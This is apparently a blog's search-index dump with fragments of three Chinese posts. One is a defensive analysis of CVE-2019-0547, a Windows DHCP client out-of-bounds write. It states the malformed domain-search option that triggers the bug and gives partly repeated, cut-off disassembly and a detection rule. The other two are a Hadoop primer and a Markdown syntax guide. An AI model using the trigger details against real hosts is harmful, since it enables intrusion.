漏洞触发文件：DHCP服务主机上运行的dcpcore.dll 漏洞触发函数：dhcpcore!DecodeDomainSearchListData() 漏洞触发数据对象：一个原本用于存储域搜索结果的堆缓冲区 ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:3","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"漏洞分析 基础知识 动态主机配置协议(DHCP)，主要用于集中管理和自动化网络上IP地址的分配。 它是BOOTP协议的扩展。 除了IP地址分配外，DHCP客户端还从DHCP服务器接收管理其网络配置所需的信息，包括子网掩码，网关地址，DNS服务器地址等。 DHCP使用UDP端口67和68进行通信。 DHCP在所有现代操作系统上都是标准的-并且默认情况下已对网络接口启用-在Microsoft Windows上。 典型的DHCP事务流程如下： client发送DHCP DISCOVER到server server发送DHCP OFFER到client client发送DHCP REQUEST到server server响应一个DHCP ACK到client 总结上面的过程，DHCP的工作方式如下：在客户端获取IP地址之前，它会在本地网络上广播DHCP DISCOVER消息。 本地网络上的任何DHCP服务器都可以使用DHCP OFFER响应，其中包含分配给客户端的IP地址。 该IP地址通常是租用的，这意味着它会在一定时间后过期。为了续订租约，客户端向DHCP服务器发送单播DHCP REQUEST消息。 DHCP服务器以DHCP ACK消息响应。 所有DHCP message均以通用的报头结构开头。所有多字节值均以网络字节顺序排列。 该结构描述如下[1]： offset size value 0x0000 1 Operation code (1 - request, 2 - response) 0x0001 1 Hardware type (1 - Ethernet) 0x0002 1 Hardware address length (usually 6 for Ethernet) 0x0003 1 Hops 0x0004 4 Transaction ID 0x0008 2 Time since client started 0x000A 2 Flags 0x000C 4 Client IP address if assigned 0x0010 4 Client IP address 0x0014 4 Next server IP address 0x0018 4 Relay IP address 0x001C 16 Client hardware address 0x002C 64 Server hostname (optional) 0x006C 128 Boot file name 0x00EC 4 Magic cookie (0x63 0x82 0x53 0x63) 0x00F0 variable Options 通用标头的长度是固定的，但是后面可以跟可变长度的DHCP选项。 每个单独的DHCP选项具有以下格式： Offset Size Value 0000 1 Option tag 0001 1 Option length (len) 0002 len Option data 除了IP地址（包含在“客户端IP地址”字段中）之外，DHCP message还使用“option”来包括其他几个配置参数，例如“子网掩码”（option tag：1），“路由器”（option tag：3），DNS服务器（option tag：6），NTP服务器（option tag：4），域搜索（option tag：119）。 有关标准option tag的列表，请参见[3]。 该漏洞主要与“域搜索”选项有关，该选项包含一个或多个DNS后缀，如果DNS名称不能自行解析，则客户端可以使用该后缀附加到DNS名称。 例如，考虑将分发“example.com”的DHCP服务器作为域搜索DNS后缀。 如果客户端向DNS查询“foo”，但没有收到任何DNS记录，则它将继续查询“foo.example.com”。使用此功能可避免对网络内的所有主机重复使用通用组织DNS后缀。 域搜索选项的选项数据字段包含wire format的DNS名称列表。DNS名称对一个或多个DNS标签进行编码，并以终止于零的字符结尾。DNS标签可以压缩或不压缩。未压缩的DNS标签是一字节长度的前缀的八位字节字符串。压缩标签是一个两字节的无符号整数值，其前两个最高有效位设置为1，其余位以字节为单位存储偏移量。因此，单个DNS名称可能由压缩和未压缩标签混合组成。DNS根目录“.”由单字节“\\x00”表示。使用未压缩的名称编码DNS名称“example.example.com”将变成“ \\x07example\\x07example\\x03com\\x00”。可以使用压缩标签将其编码如下：“\\x07example\\xc0\\x00\\x03com\\x00”。有关DNS名称的更多信息，请参见[2]。 原理分析 在Windows的DHCP客户端中存在越界写漏洞。DHCP客户端在启动时作为svchost.exe服务运行，并遵循DHCP协议来获取系统上网络接口的IP地址。当收到DHCP答复时，它将使用dhcpcore解析DHCP选项！ DhcpExtractFullOptions()，当遇到域搜索选项（option tag：119）时，该调用再调用dhcpcore！DecodeDomainSearchListData()。此函数主要将wire format的DNS名称转换为基于文本的DNS名称。它遍历每个DNS名称，在堆上分配内存，解压缩遇到的任何标签，并使用memcpy()复制标签，并在标签之间插入“.”，名称之间插入\",\"。用于存储DNS名称的已分配缓冲区大小是基于长度的字符串，并且由于DNS名称以空值结尾，因此缓冲区大小比DNS名称小1。因此，DNS名称“\\x07example\\x03com\\x00”导致缓冲区大小为12（请注意，字符串的长度为13）。如果DHCP回复消息包含前两个字节为零的域搜索选项，则调用程序函数将它们视为两个不同名称的两个以空字符结尾的字符，并将大小为0传递给dhcpcore！DecodeDomainSearchListData()，该函数将无法正确验证，而是调用HeapAlloc分配0字节的缓冲区。然后，它继续处理两个根标签，并写入无效缓冲区，从而导致越界写入。 攻击者可以设置一个恶意的DHCP服务器并使用恶意的DHCP响应消息来响应同一网段中的DHCP请求，从而利用该漏洞。 代码分析 分析使用的dhcpcore.dll版本为10.0.17134.191。 ; dhcpcore!DecodeDomainSearchListData: 6ffcb0cc 8bff mov edi,edi 6ffcb0ce 55 push ebp 6ffcb0cf 8bec mov ebp,esp 6ffcb0d1 83ec2c sub esp,2Ch 6ffcb0d4 8bc2 mov eax,edx 6ffcb0d6 894de4 mov dword ptr [ebp-1Ch],ecx 6ffcb0d9 8bc8 mov ecx,eax 6ffcb0db 8945f0 mov dword ptr [ebp-10h],eax 6ffcb0de 53 push ebx 6ffcb0df 8b5d0c mov ebx,dword ptr [ebp+0Ch] 6ffcb0e2 33d2 xor edx,edx 6ffcb0e4 c1e902 shr ecx,2 6ffcb0e7 83c164 add ecx,64h 6ffcb0ea 56 push esi 6ffcb0eb 33f6 xor esi,esi 6ffcb0ed 894dd4 mov dword ptr [ebp-2Ch],ecx 6ffcb0f0 8b4df0 mov ecx,dword ptr [ebp-10h] 6ffcb0f3 83f802 cmp eax,2 6ffcb0f6 57 push edi 6ffcb0f7 8b7d14 mov edi,dword ptr [ebp+14h] 6ffcb0fa 1bc0 sbb eax,eax 6ffcb0fc 40 inc eax 6ffcb0fd 8907 mov dword ptr [edi],eax ; 外层循环开始 6ffcb0ff 833f00 cmp dword ptr [edi],0 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx ; edx是计数器 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx ; 第一次迭代时跳过HeapFree 6ffcb10c 83fa02 cmp edx,2 6ffcb0fd 8907 mov dword ptr [edi],eax 6ffcb0ff 833f00 cmp dword ptr [edi],0 ; 第二次迭代, HeapFree and HeapAlloc都发生了. 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx 6ffcb10c 83fa02 cmp edx,2 6ffcb10f 7533 jne dhcpcore!DecodeDomainSearchListData+0x78 6f","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:4","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"检测思路 首先要监听UDP的67/68端口的流量。检测设备可以根据DHCP Magic Cookie值\\x63\\x82\\x53\\x63来判断是否为DHCP消息。 如果操作码为2，则检测设备必须解析每个DHCP选项，并检查option tag设置为0x77的所有选项的选项数据。如果发现任何此类选项的选项数据以“\\x00\\x00”开头，则应将流量视为可疑的攻击流量。 ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:5","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"总结 这个分析思路很清楚，基本上是一个漏洞响应的微缩过程，到最后给出解决方案，个人感觉比较成熟。最后的流量检测现在很多的防火墙都可以实现，从流量侧拦截攻击好过主机防御。 参考文献 [1] RFC 2131, Dynamic Host Configuration Protocol https://tools.ietf.org/html/rfc2131 [2] P. Mockapetris, RFC 1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION, https://tools.ietf.org/html/rfc1035 [3] IANA, Dynamic Host Configuration Protocol (DHCP)and Bootstrap Protocol (BOOTP) Parameters, https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:1:0","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-14","objectID":"/2019/10/hadoop1/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(一)–相关概念 本系列将从Hadoop学习到其漏洞复现分析进行完整记录。 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"一、大数据 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Big Data：主要是指无法在一定范围内用常规润健工具进行捕捉、管理和处理的数据集合，需要新处理模式才能具有更强的决策力、洞察发现力和流程化能力的海量、高增长率和多样化的信息资产。一言概括：数据多到传统方案无法处理。 数据的体量并不是最重要，重要的是隐藏在数据中的信息的价值。(比如我们常见的大数据杀熟) ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"2. 单位 从小到大依次为： `bit` `Byte` `KB` `MB` `GB` `TB` `PB` `EB` `ZB` `YB` `BB` `NB` 和 `DB` ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"3. 特点 大量：体量大 高速：处理数据的速度必须要快 多样：不同场景会产生不同的数据源 低价值密度：即使数据量很大，我们始终关注的应该只是特定的一部分，而并不是整体 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"二、Hadoop ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"1. 概念 Hadoop是一个由Apache基金会所开发的分布式系统基础架构，主要用来解决大数据的存储和分析计算问题。现在已发展成为一个完整的生态技术，而不是单纯的Hadoop产品。 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"2. 版本 Apache版本：最原始(最基础)的版本，对于入门学习最好，毕竟是出生地，血统也是最正的。(本系列文章主要专注于该版本) Cloudera ：在大型互联网企业中用的较多。 Hortonworks：文档比较全。 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"3. 优势 高可靠性：底层使用多个数据副本(分布式存储的生动体现) 高扩展性：在集群间分配任务数据，可以方便的扩展数以千计的节点。 高效性：在MapReduce思想下，Hadoop被设计为并行工作 高容错性：能将失败的任务重新分配 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"4. 组成部分 Hadoop 2.0之后，主要由以下四个部分组成： Common：其他Hadoop模块所需的Java库和实用程序。这些库提供文件系统和操作系统级抽象，并包含启动Hadoop所需的Java文件和脚本 Map-Reduce：计算 Yarn： 资源调度 HDFS： 数据存储 1. Map - Reduce编程模型 定义：分布式运算程序的编程框架，核心框架，主要功能是将用户编写的业务逻辑代码和自带默认组件整合成完整的分布式运算程序，并发运行在一个Hadoop集群上。 阶段：map阶段和reduce阶段，核心思想是将任务进行并行计算，分而治之，然后将结果汇总 2. Yarn 诞生于Hadoop 2.x阶段，主要负责资源调度(2.x之前，资源调度由map-reduce负责) 架构组成： ResourceManger(RM)：处理客户端请求、监控NodeManger、启动或监控ApplicationMaster、资源分配于调度 NodeManager(NM)：管理带个节点上的资源、处理来自RM的命令、处理来自AM的命令 ApplicationMaster(AM)：负责数据的切分、为应用程序申请资源并分配给内部的任务、任务的监控与容错 Container：Yarn中的资源抽吸那个，封装了某个节点上的多维度资源，如CPU、内存、磁盘、网络等 3. HDFS 概念：Hasdoop Distributed FIle System，Hadoop分布式文件系统，负责文件存储部分。 架构组成： NameNode(nn)：存储文件的元数据，如文件名、文件目录结构、文件属性(生成时间、副本数、文件权限)，以及每个文件的块列表和块所在的DataNode等 DataNode(dn)：在本地文件系统存储文件块数据，以及块数据的校验和。 Secondary NameNode(2nn)：监控HDFS状态的辅助后台程序，每隔一段时间获取HDFS元数据的快照。 对以上架构举例进行解释：在图书馆中，NameNode存储的是图书馆所有书籍的目录、作者、书的位置等信息，DataNode是存放书籍的书架，Secondary NameNode主要是存储每本书的副本，防止一本书损坏，没有其他的副本可用。 ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(一)--相关概念","uri":"/2019/10/hadoop1/"},{"categories":["Misc"],"content":"Markdown 基本语法","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"Markdown 基本语法 这篇文章提供了可以在 Hugo 的文章中使用的基本 Markdown 语法示例. 注意 这篇文章借鉴了一篇很棒的来自 Grav 的文章. 如果你想了解 Loveit 主题的扩展 Markdown 语法, 请阅读扩展 Markdown 语法页面. 事实上, 编写 Web 内容很麻烦. WYSIWYG所见即所得 编辑器帮助减轻了这一任务. 但通常会导致代码太糟, 或更糟糕的是, 网页也会很丑. 没有通常伴随的所有复杂和丑陋的问题, Markdown 是一种更好的生成 HTML 内容的方式. 一些主要好处是: Markdown 简单易学, 几乎没有多余的字符, 因此编写内容也更快. 用 Markdown 书写时出错的机会更少. 可以产生有效的 XHTML 输出. 将内容和视觉显示保持分开, 这样就不会打乱网站的外观. 可以在你喜欢的任何文本编辑器或 Markdown 应用程序中编写内容. Markdown 使用起来很有趣! John Gruber, Markdown 的作者如是说: Markdown 格式的首要设计目标是更具可读性. 最初的想法是 Markdown 格式的文档应当以纯文本形式发布, 而不会看起来像被标签或格式说明所标记. 虽然 Markdown 的语法受到几种现有的文本到 HTML 转换工具的影响, 但 Markdown 语法的最大灵感来源是纯文本电子邮件的格式. – John Gruber 话不多说, 我们来回顾一下 Markdown 的主要语法以及生成的 HTML 样式! 技巧  将此页保存为书签，以备将来参考! ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:0:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"1 标题 从 h2 到 h6 的标题在每个级别上都加上一个 ＃: ## h2 标题 ### h3 标题 #### h4 标题 ##### h5 标题 ###### h6 标题 输出的 HTML 看起来像这样: \u003ch2\u003eh2 标题\u003c/h2\u003e \u003ch3\u003eh3 标题\u003c/h3\u003e \u003ch4\u003eh4 标题\u003c/h4\u003e \u003ch5\u003eh5 标题\u003c/h5\u003e \u003ch6\u003eh6 标题\u003c/h6\u003e 标题 ID 要添加自定义标题 ID, 请在与标题相同的行中将自定义 ID 放在花括号中: ### 一个很棒的标题 {#custom-id} 输出的 HTML 看起来像这样: \u003ch3 id=\"custom-id\"\u003e一个很棒的标题\u003c/h3\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:1:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"2 注释 注释是和 HTML 兼容的： \u003c!-- 这是一段注释 --\u003e 不能看到以下的注释: ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:2:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"3 水平线 HTML 中的 \u003chr\u003e 标签是用来在段落元素之间创建一个 “专题间隔” 的. 使用 Markdown, 你可以用以下方式创建一个 \u003chr\u003e 标签: ___: 三个连续的下划线 ---: 三个连续的破折号 ***: 三个连续的星号 呈现的输出效果如下: ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:3:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"4 段落 按照纯文本的方式书写段落, 纯文本在呈现的 HTML 中将用 \u003cp\u003e/\u003c/p\u003e 标签包裹. 如下段落: Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad. 输出的 HTML 看起来像这样: \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e 可以使用一个空白行进行换行. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:4:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"5 内联 HTML 元素 如果你需要某个 HTML 标签 (带有一个类), 则可以简单地像这样使用: Markdown 格式的段落. \u003cdiv class=\"class\"\u003e 这是 \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown 格式的段落. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:5:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"6 强调 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"加粗 用于强调带有较粗字体的文本片段. 以下文本片段会被 渲染为粗体. **渲染为粗体** __渲染为粗体__ 输出的 HTML 看起来像这样: \u003cstrong\u003e渲染为粗体\u003c/strong\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:1","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"斜体 用于强调带有斜体的文本片段. 以下文本片段被 渲染为斜体. *渲染为斜体* _渲染为斜体_ 输出的 HTML 看起来像这样: \u003cem\u003e渲染为斜体\u003c/em\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:2","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"删除线 按照 GFMGitHub flavored Markdown 你可以使用删除线. ~~这段文本带有删除线.~~ 呈现的输出效果如下: 这段文本带有删除线. 输出的 HTML 看起来像这样: \u003cdel\u003e这段文本带有删除线.\u003c/del\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:3","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"组合 加粗, 斜体, 和删除线可以 组合使用. ***加粗和斜体*** ~~**删除线和加粗**~~ ~~*删除线和斜体*~~ ~~***加粗, 斜体和删除线***~~ 呈现的输出效果如下: 加粗和斜体 删除线和加粗 删除线和斜体 加粗, 斜体和删除线 输出的 HTML 看起来像这样: \u003cem\u003e\u003cstrong\u003e加粗和斜体\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003e删除线和加粗\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e删除线和斜体\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003e加粗, 斜体和删除线\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:6:4","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"7 引用 用于在文档中引用其他来源的内容块. 在要引用的任何文本之前添加 \u003e: \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 呈现的输出效果如下: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 输出的 HTML 看起来像这样: \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e 引用也可以嵌套: \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. 呈现的输出效果如下: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:7:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"8 列表 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"无序列表 一系列项的列表, 其中项的顺序没有明显关系. 你可以使用以下任何符号来表示无序列表中的项: * 一项内容 - 一项内容 + 一项内容 例如: * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e \u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:1","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"有序列表 一系列项的列表, 其中项的顺序确实很重要. 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e 技巧 如果你对每一项使用 1., Markdown 将自动为每一项编号. 例如: 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:2","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"任务列表 任务列表使你可以创建带有复选框的列表. 要创建任务列表, 请在任务列表项之前添加破折号 (-) 和带有空格的方括号 ([ ]). 要选择一个复选框，请在方括号之间添加 x ([x]). - [x] Write the press release - [ ] Update the website - [ ] Contact the media 呈现的输出效果如下: Write the press release Update the website Contact the media ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:8:3","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"9 代码 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"行内代码 用 ` 包装行内代码段. 在这个例子中, `\u003csection\u003e\u003c/section\u003e` 会被包裹成 **代码**. 呈现的输出效果如下: 在这个例子中, \u003csection\u003e\u003c/section\u003e 会被包裹成 代码. 输出的 HTML 看起来像这样: \u003cp\u003e 在这个例子中, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e 会被包裹成 \u003cstrong\u003e代码\u003c/strong\u003e. \u003c/p\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:1","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"缩进代码 将几行代码缩进至少四个空格，例如: // Some comments line 1 of code line 2 of code line 3 of code 呈现的输出效果如下: // Some comments line 1 of code line 2 of code line 3 of code 输出的 HTML 看起来像这样: \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:2","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"围栏代码块 使用 “围栏” ``` 来生成一段带有语言属性的代码块. ```markdown Sample text here... ``` 输出的 HTML 看起来像这样: \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:3","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"语法高亮 GFMGitHub Flavored Markdown 也支持语法高亮. 要激活它，只需在第一个代码 “围栏” 之后直接添加你要使用的语言的文件扩展名, ```js, 语法高亮显示将自动应用于渲染的 HTML 中. 例如, 在以下 JavaScript 代码中应用语法高亮: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` 呈现的输出效果如下: grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; 注意 Hugo 文档中的 语法高亮页面 介绍了有关语法高亮的更多信息, 包括语法高亮的 shortcode. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:9:4","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"10 表格 通过在每个单元格之间添加竖线作为分隔线, 并在标题下添加一行破折号 (也由竖线分隔) 来创建表格. 注意, 竖线不需要垂直对齐. | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext 